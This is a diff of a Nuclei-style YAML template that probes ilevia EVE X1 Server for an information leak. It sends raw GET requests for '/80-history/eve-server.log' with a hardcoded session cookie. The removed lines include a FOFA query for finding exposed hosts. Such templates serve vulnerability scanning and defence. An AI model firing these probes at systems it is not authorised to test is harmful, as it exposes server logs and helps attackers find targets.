@@ -3,12 +3,8 @@ info:
   name: IleviaEVEX1Server eve server存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kce0gqt4wsyssez0'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kce0gqt4wsyssez0
-    fofa: app="ilevia-EVE-X1-Server"
 http:
 - raw:
   - 'GET /80-history/eve-server.log HTTP/1.1
@@ -29,8 +25,6 @@ http:
 
     User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
 
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547096656-863adb02-367c-479a-a199-1e9fba4ccab1.png)
 
     Poc2'
   redirects: false
@@ -55,10 +49,7 @@ http:
 
     Cookie: PHPSESSID=u477ikovcc936bdor4ernlmt1r
 
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547096886-0510610b-e7e3-4f19-9451-3451a78e161d.png)'
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36'
   redirects: false
   matchers:
   - status:
